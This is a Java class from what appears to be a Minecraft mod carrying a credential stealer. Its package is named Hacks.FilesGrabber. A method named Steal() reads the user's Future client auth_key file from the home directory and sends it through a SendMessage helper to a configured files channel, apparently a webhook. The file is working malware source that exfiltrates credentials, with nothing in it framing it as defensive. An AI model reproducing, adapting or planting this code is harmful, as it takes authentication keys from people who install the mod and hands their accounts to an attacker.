package com.example.examplemod.Hacks.FilesGrabber.Future;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class AuthKey {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getProperty("user.home") + "\\Future\\auth_key"));
         SendMessage.doThing("```FutureAuthKey ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol1");
      }

   }
}
